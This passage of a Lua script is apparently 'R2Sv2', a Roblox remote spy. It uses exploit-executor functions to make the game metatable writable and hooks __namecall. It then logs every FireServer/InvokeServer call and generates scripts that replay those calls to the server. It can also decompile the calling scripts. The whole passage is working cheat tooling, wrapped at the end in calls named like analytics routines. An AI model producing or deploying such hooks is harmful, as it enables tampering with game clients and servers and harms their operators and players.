Line.Size = UDim2.new(0, 40, 1, 0)
Line.ZIndex = 3
Line.Font = Enum.Font.SourceSansBold
Line.FontSize = Enum.FontSize.Size18
Line.Text = ""
Line.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Line.TextSize = 17

SourceText.Name = "SourceText"
SourceText.Parent = ScriptLine
SourceText.BackgroundColor3 = Color3.new(1, 1, 1)
SourceText.BackgroundTransparency = 1
SourceText.Position = UDim2.new(0, 40, 0, 0)
SourceText.Size = UDim2.new(1, -40, 1, 0)
SourceText.ZIndex = 3
SourceText.Font = Enum.Font.Code
SourceText.FontSize = Enum.FontSize.Size18
SourceText.Text = ""
SourceText.TextColor3 = Color3.new(1, 1, 1)
SourceText.TextSize = 17
SourceText.TextXAlignment = Enum.TextXAlignment.Left

Tokens.Name = "Tokens"
Tokens.Parent = ScriptLine
Tokens.BackgroundColor3 = Color3.new(1, 1, 1)
Tokens.BackgroundTransparency = 1
Tokens.Position = UDim2.new(0, 40, 0, 0)
Tokens.Size = UDim2.new(1, -40, 1, 0)
Tokens.ZIndex = 3
Tokens.Font = Enum.Font.Code
Tokens.FontSize = Enum.FontSize.Size18
Tokens.Text = ""
Tokens.TextColor3 = Color3.new(0.392157, 0.392157, 0.392157)
Tokens.TextSize = 17
Tokens.TextXAlignment = Enum.TextXAlignment.Left

Strings.Name = "Strings"
Strings.Parent = ScriptLine
Strings.BackgroundColor3 = Color3.new(1, 1, 1)
Strings.BackgroundTransparency = 1
Strings.Position = UDim2.new(0, 40, 0, 0)
Strings.Size = UDim2.new(1, -40, 1, 0)
Strings.ZIndex = 5
Strings.Font = Enum.Font.Code
Strings.FontSize = Enum.FontSize.Size18
Strings.Text = ""
Strings.TextColor3 = Color3.new(1, 0.615686, 0)
Strings.TextSize = 17
Strings.TextXAlignment = Enum.TextXAlignment.Left

Comments.Name = "Comments"
Comments.Parent = ScriptLine
Comments.BackgroundColor3 = Color3.new(1, 1, 1)
Comments.BackgroundTransparency = 1
Comments.Position = UDim2.new(0, 40, 0, 0)
Comments.Size = UDim2.new(1, -40, 1, 0)
Comments.ZIndex = 5
Comments.Font = Enum.Font.Code
Comments.FontSize = Enum.FontSize.Size18
Comments.Text = ""
Comments.TextColor3 = Color3.fromRGB(60, 200, 60)
Comments.TextSize = 17
Comments.TextXAlignment = Enum.TextXAlignment.Left

RemoteHighlight.Name = "RemoteHighlight"
RemoteHighlight.Parent = ScriptLine
RemoteHighlight.BackgroundColor3 = Color3.new(1, 1, 1)
RemoteHighlight.BackgroundTransparency = 1
RemoteHighlight.Position = UDim2.new(0, 40, 0, 0)
RemoteHighlight.Size = UDim2.new(1, -40, 1, 0)
RemoteHighlight.ZIndex = 3
RemoteHighlight.Font = Enum.Font.Code
RemoteHighlight.FontSize = Enum.FontSize.Size18
RemoteHighlight.Text = ""
RemoteHighlight.TextColor3 = Color3.fromRGB(0, 145, 255)
RemoteHighlight.TextSize = 17
RemoteHighlight.TextXAlignment = Enum.TextXAlignment.Left

Keywords.Name = "Keywords"
Keywords.Parent = ScriptLine
Keywords.BackgroundColor3 = Color3.new(1, 1, 1)
Keywords.BackgroundTransparency = 1
Keywords.Position = UDim2.new(0, 40, 0, 0)
Keywords.Size = UDim2.new(1, -40, 1, 0)
Keywords.ZIndex = 3
Keywords.Font = Enum.Font.Code
Keywords.FontSize = Enum.FontSize.Size18
Keywords.Text = ""
Keywords.TextColor3 = Color3.new(0.231373, 1, 0)
Keywords.TextSize = 17
Keywords.TextXAlignment = Enum.TextXAlignment.Left

Globals.Name = "Globals"
Globals.Parent = ScriptLine
Globals.BackgroundColor3 = Color3.new(1, 1, 1)
Globals.BackgroundTransparency = 1
Globals.Position = UDim2.new(0, 40, 0, 0)
Globals.Size = UDim2.new(1, -40, 1, 0)
Globals.ZIndex = 3
Globals.Font = Enum.Font.Code
Globals.FontSize = Enum.FontSize.Size18
Globals.Text = ""
Globals.TextColor3 = Color3.new(1, 0, 0)
Globals.TextSize = 17
Globals.TextXAlignment = Enum.TextXAlignment.Left

Enabled.Name = "Enabled"
Enabled.Parent = SBTN
Enabled.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
Enabled.BorderSizePixel = 1
Enabled.BorderColor3 = Color3.fromRGB(30, 100, 30)
Enabled.Position = UDim2.new(0, 210, 0, 0)
Enabled.Size = UDim2.new(0, 100, 1, 0)
Enabled.ZIndex = 4
Enabled.Font = Enum.Font.SourceSansBold
Enabled.FontSize = Enum.FontSize.Size14
Enabled.Text = "Enabled"
Enabled.TextColor3 = Color3.fromRGB(60, 200, 60)
Enabled.TextSize = 14

FullScreen.Name = "FullScreen"
FullScreen.Parent = Ribbon
FullScreen.BackgroundColor3 = Color3.new(1, 0, 0)
FullScreen.BorderSizePixel = 0
FullScreen.Position = UDim2.new(1, -90, 0, 0)
FullScreen.Size = UDim2.new(0, 40, 0, 20)
FullScreen.ZIndex = 3
FullScreen.Font = Enum.Font.SourceSansBold
FullScreen.FontSize = Enum.FontSize.Size14
FullScreen.Text = "[~]"
FullScreen.TextColor3 = Color3.new(1, 1, 1)
FullScreen.TextSize = 14

SetRemotesTab.Name = "SetRemotesTab"
SetRemotesTab.Parent = BG
SetRemotesTab.Visible = false
SetRemotesTab.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
SetRemotesTab.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
SetRemotesTab.ClipsDescendants = true
SetRemotesTab.Position = UDim2.new(0, 270, 1, -50)
SetRemotesTab.Size = UDim2.new(1, -280, 0, 40)
SetRemotesTab.ZIndex = 2

FilterF.Name = "FilterF"
FilterF.Parent = SetRemotesTab
FilterF.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
FilterF.BorderColor3 = Color3.new(0.392157, 0.117647, 0.117647)
FilterF.Position = UDim2.new(0, 120, 0.5, -10)
FilterF.Size = UDim2.new(0, 120, 0, 20)
FilterF.ZIndex = 3
FilterF.Font = Enum.Font.SourceSansBold
FilterF.FontSize = Enum.FontSize.Size14
FilterF.Text = "FILTER FUNCTIONS"
FilterF.TextColor3 = Color3.new(0.784314, 0.235294, 0.235294)
FilterF.TextSize = 14

FilterE.Name = "FilterE"
FilterE.Parent = SetRemotesTab
FilterE.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
FilterE.BorderColor3 = Color3.new(0.392157, 0.117647, 0.117647)
FilterE.Position = UDim2.new(0, 10, 0.5, -10)
FilterE.Size = UDim2.new(0, 100, 0, 20)
FilterE.ZIndex = 3
FilterE.Font = Enum.Font.SourceSansBold
FilterE.FontSize = Enum.FontSize.Size14
FilterE.Text = "FILTER EVENTS"
FilterE.TextColor3 = Color3.new(0.784314, 0.235294, 0.235294)
FilterE.TextSize = 14

Search.Name = "Search"
Search.Parent = SetRemotesTab
Search.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)
Search.BorderColor3 = Color3.new(0.243137, 0.243137, 0.243137)
Search.Position = UDim2.new(0, 250, 0.5, -10)
Search.Selectable = true
Search.Size = UDim2.new(1, -260, 0, 20)
Search.ZIndex = 3
Search.Font = Enum.Font.SourceSansBold
Search.FontSize = Enum.FontSize.Size14
Search.Text = "[SEARCH]"
Search.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
Search.TextSize = 14

-- FrontEnd-Backend // UI Functions

local HasSpecial = function(string)
    return (string:match("%c") or string:match("%s") or string:match("%p")) ~= nil
end

local GetPath = function(Instance)
	local Obj = Instance
	local string = {}
	local temp = {}
	local error = false
	
	while Obj ~= game do
		if Obj == nil then
			error = true
			break
		end
		table.insert(temp, Obj.Parent == game and Obj.ClassName or tostring(Obj))
		Obj = Obj.Parent
	end
	
	table.insert(string, "game:GetService(\"" .. temp[#temp] .. "\")")
	
	for i = #temp - 1, 1, -1 do
		table.insert(string, HasSpecial(temp[i]) and "[\"" .. temp[i] .. "\"]" or "." .. temp[i])
	end

	return (error and "nil -- Path contained invalid instance" or table.concat(string, ""))
end

local GetType = function(Instance)
	local Types = 
	{
		EnumItem = function()
			return "Enum." .. tostring(Instance.EnumType) .. "." .. tostring(Instance.Name)
		end,
		Instance = function()
			return GetPath(Instance)
		end,
		CFrame = function()
			return "CFrame.new(" .. tostring(Instance) .. ")"
		end,
		Vector3 = function()
			return "Vector3.new(" .. tostring(Instance) .. ")"
		end,
		BrickColor = function()
			return "BrickColor.new(\"" .. tostring(Instance) .. "\")"
		end,
		Color3 = function()
			return "Color3.new(" .. tostring(Instance) .. ")"
		end,
		string = function()
			local S = tostring(Instance)
			return "\"" .. (encrypt_string and S:gsub(".", function(c) return "\\" .. c:byte() end) or S) .. "\""
		end,
		Ray = function()
			return "Ray.new(Vector3.new(" .. tostring(Instance.Origin) .. "), Vector3.new(" .. tostring(Instance.Direction) .. "))"
		end
	}

	return Types[typeof(Instance)] ~= nil and Types[typeof(Instance)]() or tostring(Instance)
end

local size_frame = function(frame, UDim)
	frame:TweenSize(UDim, "Out", "Quint", 0.3)
end

local pos_frame = function(frame, UDim)
	frame:TweenPosition(UDim, "Out", "Quint", 0.3)
end

local size_pos_frame = function(frame, UDim, UDim2)
	frame:TweenSizeAndPosition(UDim, UDim2, "Out", "Quint", 0.3)
end

local hide = function()
	size_frame(BG, UDim2.new(0, 300, 0, 20))
	pos_frame(Title, UDim2.new(0, 0, 0, 0))
	pos_frame(Remotes, UDim2.new(0, 10, 0, 100))
	pos_frame(Source, UDim2.new(0, 270, 0, 100))
	BG.Draggable = true
	SetRemotes.Visible = false
	SetRemotesTab.Visible = false
	Source.Visible = true
	
	return "[]"
end

local show = function()
	size_frame(BG, UDim2.new(1, -300, 1, -200))
	pos_frame(BG, UDim2.new(0.1, 0, 0.1, 0))
	pos_frame(Title, UDim2.new(0.5, -100, 0, 0))
	pos_frame(Remotes, UDim2.new(0, 10, 0, 80))
	pos_frame(Source, UDim2.new(0, 270, 0, 80))
	BG.Draggable = false
	
	return "_"
end

local onclick_hide = function()
	Hide.Text = Hide.Text == "_" and hide() or show()
end

local onclick_settings = function()
	Source.Visible = not Source.Visible
	SetRemotes.Visible = not Source.Visible
	SetRemotesTab.Visible = not Source.Visible
end

local onclick_remotespy = function()
	spy_enabled = not spy_enabled
	EnableSpy.TextColor3 = EnableSpy.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
	EnableSpy.BorderColor3 = EnableSpy.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
end

local onclick_cryptstring = function()
	encrypt_string = not encrypt_string
	CryptStrings.TextColor3 = CryptStrings.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
	CryptStrings.BorderColor3 = CryptStrings.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
end

local clear_logs = function()
	Remotes:ClearAllChildren()
	remotes_fired = 0
	Total.Text = "0"
end

local filter_events = function()
	local n = 0
	for i, v in pairs(SetRemotes:GetChildren()) do
		v.Visible = not (FilterE.TextColor3 == Color3.fromRGB(60, 200, 60) and v.Icon.Image == "rbxassetid://413369623")
		if v.Visible == true then
			n = n + 1
			v.Position = UDim2.new(0, 10, 0, -20 + n * 30)
		else
			v.Position = UDim2.new(0, 10, 0, -20 + i * 30)
		end
	end
end

local filter_functions = function()
	local n = 0
	for i, v in pairs(SetRemotes:GetChildren()) do
		v.Visible = not (FilterF.TextColor3 == Color3.fromRGB(60, 200, 60) and v.Icon.Image == "rbxassetid://413369506")
		if v.Visible == true then
			n = n + 1
			v.Position = UDim2.new(0, 10, 0, -20 + n * 30)
		else
			v.Position = UDim2.new(0, 10, 0, -20 + i * 30)
		end
	end
end

local onclick_fevents = function()
	FilterE.TextColor3 = FilterE.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
	FilterE.BorderColor3 = FilterE.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
	filter_events()
end

local onclick_ffunctions = function()
	FilterF.TextColor3 = FilterF.TextColor3 == Color3.fromRGB(60, 200, 60) and Color3.fromRGB(200, 60, 60) or Color3.fromRGB(60, 200, 60)
	FilterF.BorderColor3 = FilterF.TextColor3 == Color3.fromRGB(200, 60, 60) and Color3.fromRGB(100, 30, 30) or Color3.fromRGB(30, 100, 30)
	filter_functions()
end

local Highlight = function(string, keywords)
    local K = {}
    local S = string
    local Token =
    {
        ["="] = true,
        ["."] = true,
        [","] = true,
        ["("] = true,
        [")"] = true,
        ["["] = true,
        ["]"] = true,
        ["{"] = true,
        ["}"] = true,
        [":"] = true,
        ["*"] = true,
        ["/"] = true,
        ["+"] = true,
        ["-"] = true,
        ["%"] = true,
		[";"] = true,
		["~"] = true
    }
    for i, v in pairs(keywords) do
        K[v] = true
    end
    S = S:gsub(".", function(c)
        if Token[c] ~= nil then
            return "\32"
        else
            return c
        end
    end)
    S = S:gsub("%S+", function(c)
        if K[c] ~= nil then
            return c
        else
            return (" "):rep(#c)
        end
    end)
  
    return S
end

local Tokens = function(string)
    local Token =
    {
        ["="] = true,
        ["."] = true,
        [","] = true,
        ["("] = true,
        [")"] = true,
        ["["] = true,
        ["]"] = true,
        ["{"] = true,
        ["}"] = true,
        [":"] = true,
        ["*"] = true,
        ["/"] = true,
        ["+"] = true,
        ["-"] = true,
        ["%"] = true,
		[";"] = true,
		["~"] = true
    }
    local A = ""
    string:gsub(".", function(c)
        if Token[c] ~= nil then
            A = A .. c
        elseif c == "\n" then
            A = A .. "\n"
		elseif c == "\t" then
			A = A .. "\t"
        else
            A = A .. "\32"
        end
    end)
  
    return A
end

local strings = function(string)
    local highlight = ""
    local quote = false
    string:gsub(".", function(c)
        if quote == false and c == "\"" then
            quote = true
        elseif quote == true and c == "\"" then
            quote = false
        end
        if quote == false and c == "\"" then
            highlight = highlight .. "\""
        elseif c == "\n" then
            highlight = highlight .. "\n"
	elseif c == "\t" then
	    highlight = highlight .. "\t"
        elseif quote == true then
            highlight = highlight .. c
        elseif quote == false then
            highlight = highlight .. "\32"
        end
    end)
  
    return highlight
end

local comments = function(string)
    local ret = ""
    string:gsub("[^\r\n]+", function(c)
        local comm = false
        local i = 0
        c:gsub(".", function(n)
            i = i + 1
            if c:sub(i, i + 1) == "--" then
                comm = true
            end
            if comm == true then
                ret = ret .. n
            else
                ret = ret .. "\32"
            end
        end)
        ret = ret
    end)
    
    return ret
end

local copy_source = function()
	local script = ""
	local copy
	for i, v in pairs(Source:GetChildren()) do
		script = script .. v.SourceText.Text .. "\n"
	end
	if Clipboard ~= nil then
		copy = Clipboard.set
	elseif Synapse ~= nil then
		copy = function(str)
			Synapse:Copy(str)
		end
	elseif setclipboard ~= nil then	
		copy = setclipboard
	end
	copy(script)
end

local onclick_fullscreen = function()
	size_pos_frame(BG, UDim2.new(1, 0, 1, 40), UDim2.new(0, 0, 0, -40))
	BG.Draggable = false
end

local filter_remotes = function(type)
	local n = 0
	if type == "Text" then
		for i, v in pairs(SetRemotes:GetChildren()) do
			if v.Name:lower():match(Search.Text:lower()) and string ~= "" then
				v.Visible = true
				n = n + 1
			else
				v.Visible = false
			end
			if v.Visible == true then
				v.Position = UDim2.new(0, 10, 0, -20 + n * 30)
			else
				v.Position = UDim2.new(0, 10, 0, -20 + i * 30)
			end
		end
	end
end

local fix = function(string)
	if string == "/e fix" then
		show()
		wait(0.3)
		pos_frame(BG, UDim2.new(0.1, 0, 0.1, 0))
	end
end

-- FrontEnd-Connections // UI Events

Hide.MouseButton1Down:Connect(onclick_hide)
Settings.MouseButton1Down:Connect(onclick_settings)
ClearList.MouseButton1Down:Connect(clear_logs)
EnableSpy.MouseButton1Down:Connect(onclick_remotespy)
ToClipboard.MouseButton1Down:Connect(copy_source)
CryptStrings.MouseButton1Down:Connect(onclick_cryptstring)
FullScreen.MouseButton1Down:Connect(onclick_fullscreen)
FilterE.MouseButton1Down:Connect(onclick_fevents)
FilterF.MouseButton1Down:Connect(onclick_ffunctions)
Search.Changed:Connect(filter_remotes)
game:GetService("Players").LocalPlayer.Chatted:Connect(fix)

-- Recursive Remotefill // UI-Backend

Table_TS = function(T)
    local M = {}
    for i, v in pairs(T) do
        local I = "\n\t" .. (type(i) == "number" and "[" .. i .. "] = " or "[\"" .. i .. "\"] = ")
        table.insert(M, I .. (type(v) == "table" and Table_TS(v) or GetType(v)))
    end
    
    return "\n{" .. table.concat(M, ", ") .. "\n}"
end

function fill(base)
	for i, v in pairs(base:GetChildren()) do
		if v.ClassName:match("Remote") and v.Name ~= "CharacterSoundEvent" then
			local B = SBTN:Clone()
			
			B.Parent = SetRemotes
			B.Icon.Image = (v.ClassName == "RemoteEvent" and "rbxassetid://413369506" or "rbxassetid://413369623")
			B.RemoteName.Text = v.Name
			B.ID.Text = GetPath(v)
			B.Name = v.Name
			B.Position = UDim2.new(0, 10, 0, -20 + #SetRemotes:GetChildren() * 30)
			B.MouseButton1Down:Connect(function()
				B.Enabled.Text = B.Enabled.Text == "Enabled" and "Disabled" or "Enabled"
				B.Enabled.TextColor3 = B.Enabled.Text == "Enabled" and Color3.fromRGB(60, 200, 60) or Color3.fromRGB(200, 60, 60)
				B.Enabled.BorderColor3 = B.Enabled.Text == "Enabled" and Color3.fromRGB(30, 100, 30) or Color3.fromRGB(100, 30, 30)
			end)
		end
		fill(v)
	end
end

fill(game)

-- Backend // Remotespy Backend

local game_meta = getrawmetatable(game)
local game_namecall = game_meta.__namecall
local namecall_dump = {}
local current_rmt = nil
local g_caller = nil
local f_return = nil
local Step = game:GetService("RunService").Stepped

local mwr

if setreadonly ~= nil then
	mwr = function()
		setreadonly(game_meta, false)
	end
elseif make_writeable ~= nil then	
	mwr = function()
		make_writeable(game_meta)
	end
end

mwr()

local namecall_script = function(object, method, ...)
	local script = "-- Script generated by R2Sv2\n-- R2Sv2 developed by Luckyxero\n\32\n"
	local args = {}
	for i, v in pairs{...} do
		script = script .. "local A_" .. i .. " = " .. (type(v) == "table" and Table_TS(v) or GetType(v)) .. "\n"
		table.insert(args, "A_" .. i)
	end
	script = script .. "local Event = " .. GetPath(object) .. "\n\n"
	script = script .. "Event:" .. method .. "(" .. table.concat(args, ", ") .. ")"
	
	return script
end

local dump_script = function(script)
	Source:ClearAllChildren()
	local lines = 0
	script:gsub("[^\r\n]+", function(c)
		lines = lines + 1
		local tabs = 0
		c:gsub("%\t", function() tabs = tabs + 1 end)
		local line = ScriptLine:Clone()
		line.Parent = Source
		line.SourceText.Text = c 
		line.Line.Text = lines
		line.RemoteHighlight.Text = Highlight(c, {"FireServer", "InvokeServer", "invokeServer", "fireServer"})
		line.Position = UDim2.new(0, tabs * (17 * 2), 0, -17 + #Source:GetChildren() * 17)
		line.Globals.Text = Highlight(c, global_env)
		line.Line.Position = UDim2.new(0, 0 - tabs * (17 * 2), 0, 0)
		line.Strings.Text = strings(c)
		line.Keywords.Text = Highlight(c, lua_keywords)
		line.Tokens.Text = Tokens(c)
		line.Comments.Text = comments(c)
	end)
end

local log_remote = function(table)
	if SetRemotes[table.object.Name].Enabled.Text == "Disabled" then return end
	local B = RBTN:Clone()
	g_caller = table.caller
	remotes_fired = remotes_fired + 1
	Total.Text = remotes_fired

	B.Parent = Remotes
	B.Position = UDim2.new(0, 10, 0, -20 + #Remotes:GetChildren() * 30)
	B.Icon.Image = table.method == "FireServer" and "rbxassetid://413369506" or "rbxassetid://413369623"
	B.RemoteName.Text = table.object.Name
	B.ID.Text = tostring(remotes_fired)
	B.MouseButton1Down:Connect(function()
		dump_script(table.script)
		g_caller = table.caller
		f_return = table.freturn == nil and table.object.Name .. " is not RemoteFunction" or table.freturn
	end)
end


local get_namecall_dump = function(script, object, ...)
	local Ret = nil
	if object.ClassName == "RemoteFunction" then
		local freturn = {pcall(object.InvokeServer, object, ...)}
		freturn = {select(2, unpack(freturn))}
		
		if #freturn == 0 then
			Ret = object.Name .. " is a void type RemoteFunction."
		else
			Ret = Table_TS(freturn)
		end
	end
	namecall_dump[#namecall_dump + 1] = 
	{	
		script = namecall_script(object, object.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer", ...),
		caller = script,
		object = object,
		method = object.ClassName == "RemoteEvent" and "FireServer" or "InvokeServer",
		freturn = Ret
	}
end

GetReturn.MouseButton1Down:Connect(function()
	dump_script(f_return)
end)

Decompile.MouseButton1Down:Connect(function()
	local source = decompile(g_caller)
		
	dump_script(type(source) == "boolean" and "Failed to decompile caller script!" or source)
end)

Step:Connect(function()
	while #namecall_dump > 0 do
		log_remote(table.remove(namecall_dump, 1))
	end
end)

local on_namecall = function(object, ...)
	local method = select(#{...}, ...)
	local args = {...}
	args[#args] = nil
	if object.Name ~= "CharacterSoundEvent" and method:match("Server") and spy_enabled == true then get_namecall_dump(getfenv(2).script, object, unpack(args)) end

	return game_namecall(object, ...)
end

game_meta.__namecall = on_namecall
end)
end

loadAnalytics()

wait(1)

startAnalytics()
